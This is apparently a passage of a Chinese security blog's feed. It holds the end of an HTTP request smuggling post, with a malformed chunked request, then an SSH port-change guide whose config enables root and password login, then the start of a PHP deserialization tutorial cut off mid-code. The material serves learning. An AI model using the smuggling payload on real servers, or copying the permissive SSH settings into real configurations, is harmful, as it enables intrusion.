class="hljs-symbol">\n</span><br>Content-Length: 15<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>x=1<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br>0<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><br></code></pre></td></tr></table></figure><p>成功报错，造成HTTP请求走私。</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用高端口ssh</title>
    <link href="/2021/06/03/%E4%BD%BF%E7%94%A8%E9%AB%98%E7%AB%AF%E5%8F%A3ssh/"/>
    <url>/2021/06/03/%E4%BD%BF%E7%94%A8%E9%AB%98%E7%AB%AF%E5%8F%A3ssh/</url>
    
    <content type="html"><![CDATA[<h1 id="Centos7-使用-ssh-连接之改端口-22"><a href="#Centos7-使用-ssh-连接之改端口-22" class="headerlink" title="Centos7 使用 ssh 连接之改端口 22"></a>Centos7 使用 ssh 连接之改端口 22</h1><p><strong>题记：</strong></p><p>说来贻笑大方，开始接触 ssh 时认为 22 端口作为 ssh 常用端口，放到公网上容易被别人爆破，谁让我用的是弱密码呢，我错了，但我下次还敢哈哈哈，其实有没有改端口，使用弱密码映射到公网是极不安全的，对方只要扫一扫你开放的端口，简单的爆破一下你就完蛋</p><p><strong>正题</strong></p><h2 id="一、更改-sshd-配置文件"><a href="#一、更改-sshd-配置文件" class="headerlink" title="一、更改 sshd 配置文件"></a>一、更改 sshd 配置文件</h2><p>ssh_config 是客服端的配置文件，而 centos7 作为受，啊哈，即服务端，等待连接的，修改 sshd_config</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#       $OpenBSD: sshd_config,v 1.100 2016/08/15 12:32:04 naddy Exp $</span><br><br><span class="hljs-meta"># This is the sshd server system-wide configuration file.  See</span><br><span class="hljs-meta"># sshd_config(5) for more information.</span><br><br><span class="hljs-meta"># This sshd was compiled with PATH=/usr/local/bin:/usr/bin</span><br><br><span class="hljs-meta"># The strategy used for options in the default sshd_config shipped with</span><br><span class="hljs-meta"># OpenSSH is to specify options with their default value where</span><br><span class="hljs-meta"># possible, but leave them commented.  Uncommented options override the</span><br><span class="hljs-meta"># default value.</span><br><br><span class="hljs-meta"># If you want to change the port on a SELinux system, you have to tell</span><br><span class="hljs-meta"># SELinux about this change.</span><br><span class="hljs-meta"># semanage port -a -t ssh_port_t -p tcp #PORTNUMBER</span><br><span class="hljs-meta">#</span><br><span class="hljs-meta">#Port 22</span><br>⭐Port <span class="hljs-number">23333</span><br><span class="hljs-meta">#AddressFamily any</span><br>⭐ListenAddress <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>⭐ListenAddress ::<br><br>HostKey /etc/ssh/ssh_host_rsa_key<br><span class="hljs-meta">#HostKey /etc/ssh/ssh_host_dsa_key</span><br>HostKey /etc/ssh/ssh_host_ecdsa_key<br>HostKey /etc/ssh/ssh_host_ed25519_key<br><br><span class="hljs-meta"># Ciphers and keying</span><br><span class="hljs-meta">#RekeyLimit default none</span><br><br><span class="hljs-meta"># Logging</span><br><span class="hljs-meta">#SyslogFacility AUTH</span><br>SyslogFacility AUTHPRIV<br><span class="hljs-meta">#LogLevel INFO</span><br><br><span class="hljs-meta"># Authentication:</span><br><br><span class="hljs-meta">#LoginGraceTime 2m</span><br>⭐PermitRootLogin yes<br><span class="hljs-meta">#StrictModes yes</span><br><span class="hljs-meta">#MaxAuthTries 6</span><br><span class="hljs-meta">#MaxSessions 10</span><br><br><span class="hljs-meta">#PubkeyAuthentication yes</span><br><br><span class="hljs-meta"># The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2</span><br><span class="hljs-meta"># but this is overridden so installations will only check .ssh/authorized_keys</span><br>AuthorizedKeysFile      .ssh/authorized_keys<br><br><span class="hljs-meta">#AuthorizedPrincipalsFile none</span><br><br><span class="hljs-meta">#AuthorizedKeysCommand none</span><br><span class="hljs-meta">#AuthorizedKeysCommandUser nobody</span><br><br><span class="hljs-meta"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><br><span class="hljs-meta">#HostbasedAuthentication no</span><br><span class="hljs-meta"># Change to yes if you don&#x27;t trust ~/.ssh/known_hosts for</span><br><span class="hljs-meta"># HostbasedAuthentication</span><br><span class="hljs-meta">#IgnoreUserKnownHosts no</span><br><span class="hljs-meta"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span><br><span class="hljs-meta">#IgnoreRhosts yes</span><br><br><span class="hljs-meta"># To disable tunneled clear text passwords, change to no here!</span><br><span class="hljs-meta">#PasswordAuthentication yes</span><br><span class="hljs-meta">#PermitEmptyPasswords no</span><br>⭐PasswordAuthentication yes<br><br><span class="hljs-meta"># Change to no to disable s/key passwords</span><br><span class="hljs-meta">#ChallengeResponseAuthentication yes</span><br>ChallengeResponseAuthentication no<br><br><span class="hljs-meta"># Kerberos options</span><br><span class="hljs-meta">#KerberosAuthentication no</span><br><span class="hljs-meta">#KerberosOrLocalPasswd yes</span><br><span class="hljs-meta">#KerberosTicketCleanup yes</span><br><span class="hljs-meta">#KerberosGetAFSToken no</span><br><span class="hljs-meta">#KerberosUseKuserok yes</span><br><br><span class="hljs-meta"># GSSAPI options</span><br>GSSAPIAuthentication yes<br>GSSAPICleanupCredentials no<br><span class="hljs-meta">#GSSAPIStrictAcceptorCheck yes</span><br><span class="hljs-meta">#GSSAPIKeyExchange no</span><br><span class="hljs-meta">#GSSAPIEnablek5users no</span><br><br><span class="hljs-meta"># Set this to &#x27;yes&#x27; to enable PAM authentication, account processing,</span><br><span class="hljs-meta"># and session processing. If this is enabled, PAM authentication will</span><br><span class="hljs-meta"># be allowed through the ChallengeResponseAuthentication and</span><br><span class="hljs-meta"># PasswordAuthentication.  Depending on your PAM configuration,</span><br><span class="hljs-meta"># PAM authentication via ChallengeResponseAuthentication may bypass</span><br><span class="hljs-meta"># the setting of &quot;PermitRootLogin without-password&quot;.</span><br><span class="hljs-meta"># If you just want the PAM account and session checks to run without</span><br><span class="hljs-meta"># PAM authentication, then enable this but set PasswordAuthentication</span><br><span class="hljs-meta"># and ChallengeResponseAuthentication to &#x27;no&#x27;.</span><br><span class="hljs-meta"># WARNING: &#x27;UsePAM no&#x27; is not supported in Red Hat Enterprise Linux and may cause several</span><br><span class="hljs-meta"># problems.</span><br>UsePAM yes<br><br><span class="hljs-meta">#AllowAgentForwarding yes</span><br><span class="hljs-meta">#AllowTcpForwarding yes</span><br><span class="hljs-meta">#GatewayPorts no</span><br>X11Forwarding yes<br><span class="hljs-meta">#X11DisplayOffset 10</span><br><span class="hljs-meta">#X11UseLocalhost yes</span><br><span class="hljs-meta">#PermitTTY yes</span><br><span class="hljs-meta">#PrintMotd yes</span><br><span class="hljs-meta">#PrintLastLog yes</span><br><span class="hljs-meta">#TCPKeepAlive yes</span><br><span class="hljs-meta">#UseLogin no</span><br><span class="hljs-meta">#UsePrivilegeSeparation sandbox</span><br><span class="hljs-meta">#PermitUserEnvironment no</span><br><span class="hljs-meta">#Compression delayed</span><br><span class="hljs-meta">#ClientAliveInterval 0</span><br><span class="hljs-meta">#ClientAliveCountMax 3</span><br><span class="hljs-meta">#ShowPatchLevel no</span><br><span class="hljs-meta">#UseDNS yes</span><br><span class="hljs-meta">#PidFile /var/run/sshd.pid</span><br><span class="hljs-meta">#MaxStartups 10:30:100</span><br><span class="hljs-meta">#PermitTunnel no</span><br><span class="hljs-meta">#ChrootDirectory none</span><br><span class="hljs-meta">#VersionAddendum none</span><br><br><span class="hljs-meta"># no default banner path</span><br><span class="hljs-meta">#Banner none</span><br><br><span class="hljs-meta"># Accept locale-related environment variables</span><br>AcceptEnv LANG LC_CTYPE LC_NUMERIC LC_TIME LC_COLLATE LC_MONETARY LC_MESSAGES<br>AcceptEnv LC_PAPER LC_NAME LC_ADDRESS LC_TELEPHONE LC_MEASUREMENT<br>AcceptEnv LC_IDENTIFICATION LC_ALL LANGUAGE<br>AcceptEnv XMODIFIERS<br><br><span class="hljs-meta"># override default of no subsystems</span><br>Subsystem       sftp    /usr/libexec/openssh/sftp-server<br><br><span class="hljs-meta"># Example of overriding settings on a per-user basis</span><br><span class="hljs-meta">#Match User anoncvs</span><br><span class="hljs-meta">#       X11Forwarding no</span><br><span class="hljs-meta">#       AllowTcpForwarding no</span><br><span class="hljs-meta">#       PermitTTY no</span><br><span class="hljs-meta">#       ForceCommand cvs server</span><br></code></pre></td></tr></table></figure><p>每一次更改配置文件都要重启服务才能生效</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#重启systemctl restart sshd</span><br><span class="hljs-meta">#查看systemctl status sshd</span><br><span class="hljs-meta">#停止systemctl stop sshd</span><br></code></pre></td></tr></table></figure><p>其他方法查看</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vala"><span class="hljs-meta">#进程ps -e|grep sshd</span><br><span class="hljs-meta">#网络状态netstat -an|grep 22888</span><br></code></pre></td></tr></table></figure><p>你以为这就结束了，nonono，还有两层层膜没有捅破</p><h2 id="二、开放端口"><a href="#二、开放端口" class="headerlink" title="二、开放端口"></a>二、开放端口</h2><h3 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h3><p>如果你关闭了这个安全系统，直接跳至 firewall-cmd</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">semanage port -l|<span class="hljs-keyword">grep</span> ssh<span class="hljs-comment">#打印SELinux开放ssh的情况</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/2021/06/03/.png"></p><p>好吧 它只开放了 22</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">semanage</span> port -a -t ssh_port_t -p tcp <span class="hljs-number">23333</span>#添加端口<span class="hljs-number">23333</span><br></code></pre></td></tr></table></figure><p>再次打印，已经添加完毕</p><h3 id="firewall-cmd"><a href="#firewall-cmd" class="headerlink" title="firewall-cmd"></a>firewall-cmd</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">firewall-cmd <span class="hljs-params">--permanent</span> <span class="hljs-params">--query-port=23333/tcp</span><span class="hljs-comment">#打印防火墙是否开放了tcp的23333端口</span><br></code></pre></td></tr></table></figure><p>肯定没有</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">firewall-cmd <span class="hljs-params">--permanent</span> <span class="hljs-params">--add-port=23333/tcp</span><span class="hljs-comment">#添加防火墙规则</span><br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">firewall-<span class="hljs-keyword">cmd</span><span class="bash"> --reload<span class="hljs-comment">#重载防火墙策略</span></span><br></code></pre></td></tr></table></figure><p>你登录吧 😂</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>通信隧道</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化漏洞</title>
    <link href="/2021/05/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/05/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>类中，实例化生成一个对象，而把这个对象转化成字符串，这个操作就是序列化。反过来，将字符串转化成类模板形式的对象，就是反序列化。两者结合就可以方便地存储和传输数据。</p><p>不同编程语言序列化后的存储文件不同，当然语法也不相同</p><p>我们以 php 语言为例</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210529193530927.png"></p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">serialize()</td><td align="center">将一个对象转换成一串字符串</td></tr><tr><td align="center">unserialize()</td><td align="center">将一串字符串转换成一个对象</td></tr></tbody></table><h2 id="PHP-序列化的格式"><a href="#PHP-序列化的格式" class="headerlink" title="PHP 序列化的格式"></a>PHP 序列化的格式</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs smali">a -<span class="hljs-built_in"> array</span><br><span class="hljs-built_in"></span>b - boolean<br>d -<span class="hljs-built_in"> double</span><br><span class="hljs-built_in"></span>i - integer<br>o - common object<br>r - reference<br>s - string<br>C - custom object<br>O - class//最常用的复合类型<br>N - null<br>R - pointer reference<br>U - unicode string<br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;?php<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    public $a = <span class="hljs-string">&#x27;ThisA&#x27;</span>;<br>    protected $b = <span class="hljs-string">&#x27;ThisB&#x27;</span>;<br>    private $c = <span class="hljs-string">&#x27;ThisC&#x27;</span>;<br>    public <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;this is a test!&#x27;</span>;<br>    &#125;<br>&#125;<br>$test = <span class="hljs-keyword">new</span> Test();<br>var_dump(serialize($test));<br>echo <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>var_dump(unserialize(serialize($test)))<br>?&gt;<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-keyword">string</span>(<span class="hljs-number">84</span>) <span class="hljs-string">&quot;O:4:&quot;</span>Test<span class="hljs-string">&quot;:3:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;s:5:&quot;</span>ThisA<span class="hljs-string">&quot;;s:4:&quot;</span>*b<span class="hljs-string">&quot;;s:5:&quot;</span>ThisB<span class="hljs-string">&quot;;s:7:&quot;</span>Testc<span class="hljs-string">&quot;;s:5:&quot;</span>ThisC<span class="hljs-string">&quot;;&#125;&quot;</span><br><br><span class="hljs-keyword">object</span>(Test)#<span class="hljs-number">2</span> (<span class="hljs-number">3</span>) &#123; [<span class="hljs-string">&quot;a&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisA&quot;</span> [<span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-keyword">protected</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisB&quot;</span> [<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-keyword">private</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;ThisC&quot;</span> &#125;<br></code></pre></td></tr></table></figure><h4 id="public-protected-private-在序列化时的区别"><a href="#public-protected-private-在序列化时的区别" class="headerlink" title="public/protected/private 在序列化时的区别"></a>public/protected/private 在序列化时的区别</h4><p>这个类的三个成员变量由于变量前的修饰不同，在序列化出来后显示的也不同。</p><p><code>s:1:&quot;a&quot;;s:5:&quot;ThisA&quot;;</code> ：以 <code>;</code>分开变量名和变量值，变量名为 1 个字符的 a，变量值为”ThisA”</p><p><code>s:4:&quot;*b&quot;;s:5:&quot;ThisA&quot;;</code>：多了 <code>*</code>，用以区分 protected 修饰符，另外实际页面中会出现乱码，实际上 protected 属性的表示方式是在变量名前加个<code>%00*%00</code></p><p><code>s:7:&quot;Testc&quot;;s:5:&quot;ThisC&quot;;</code>： 在变量名前加上了<code>%00类名%00</code></p><p>可以看到， 序列化后的字符串中并没有包含这个 test 方法的信息;反序列化后，类的成员变量被还原了，但是类方法没有被还原。</p><p>因为<strong>序列化不保存方法</strong></p><blockquote><p>①private 属性序列化的时候会在两侧加入空字节，private 属性序列化时会在变量前面加上加上类名</p><p>② 序列化不保存方法</p></blockquote><h2 id="常见的魔术方法"><a href="#常见的魔术方法" class="headerlink" title="常见的魔术方法"></a>常见的魔术方法</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php">__construct()<span class="hljs-comment">//类的构造函数</span><br><br>__destruct()<span class="hljs-comment">//类的析构函数</span><br><br>__call()<span class="hljs-comment">//在对象中调用一个不可访问方法时调用</span><br><br>__callStatic()<span class="hljs-comment">//用静态方式中调用一个不可访问方法时调用</span><br><br>__get()<span class="hljs-comment">//获得一个类的成员变量时调用</span><br><br>__set()<span class="hljs-comment">//设置一个类的成员变量时调用</span><br><br>__isset()<span class="hljs-comment">//当对不可访问属性调用isset()或empty()时调用</span><br><br>__unset()<span class="hljs-comment">//当对不可访问属性调用unset()时被调用。</span><br><br>__sleep()<span class="hljs-comment">//执行serialize()时，先会调用这个函数</span><br><br>__wakeup()<span class="hljs-comment">//执行unserialize()时，先会调用这个函数</span><br><br>__toString()<span class="hljs-comment">//类被当成字符串时的回应方法</span><br><br>__invoke()<span class="hljs-comment">//调用函数的方式调用一个对象时的回应方法</span><br><br>__set_state()<span class="hljs-comment">//调用var_export()导出类时，此静态方法会被调用。</span><br><br>__clone()<span class="hljs-comment">//当对象复制完成时调用</span><br><br>__autoload()<span class="hljs-comment">//尝试加载未定义的类</span><br><br>__debugInfo()<span class="hljs-comment">//打印所需调试信息</span><br></code></pre></td></tr></table></figure><h3 id="construct"><a href="#construct" class="headerlink" title="__construct()"></a>__construct()</h3><p>创建对象时就会执行的构造函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;__construct test&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> User(<span class="hljs-string">&#x27;Damn&#x27;</span>, <span class="hljs-string">&#x27;zZ&#x27;</span>, <span class="hljs-string">&#x27;10086&#x27;</span>);<br><br><span class="hljs-comment">//输出：__construct test</span><br></code></pre></td></tr></table></figure><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>对象的所有引用都被删除或者当对象被显式销毁时执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__destruct test&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> User();<br><br><span class="hljs-comment">//输出：__destruct test</span><br></code></pre></td></tr></table></figure><h3 id="Tostring"><a href="#Tostring" class="headerlink" title="__Tostring"></a>__Tostring</h3><p>当一个类对象被当成字符串时必须返回一个字符串 否则产生<strong>E_RECOVERABLE_ERROR</strong> 级别的致命错误</p><p>情形有</p><ul><li><p><input checked="" disabled="" type="checkbox">  echo ($obj)/print($obj)</p></li><li><p><input checked="" disabled="" type="checkbox">  字符串连接</p></li><li><p><input checked="" disabled="" type="checkbox">  格式化字符串</p></li><li><p><input checked="" disabled="" type="checkbox">  字符串==比较，比较的时候会转换参数类型</p></li><li><p><input checked="" disabled="" type="checkbox">  格式化 SQL 语句，绑定参数</p></li><li><p><input checked="" disabled="" type="checkbox">  数组中有字符串</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestClass</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$foo</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$foo</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;foo = <span class="hljs-variable">$foo</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;foo;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> TestClass(<span class="hljs-string">&#x27;Hello&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$class</span>;<br><br><span class="hljs-comment">//输出：hello</span><br></code></pre></td></tr></table></figure><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep()"></a>__sleep()</h3><p>对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个<strong>E_NOTICE</strong>级别的错误。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">const</span> SITE = <span class="hljs-string">&#x27;uusama&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nickname</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$nickname</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;nickname = <span class="hljs-variable">$nickname</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span 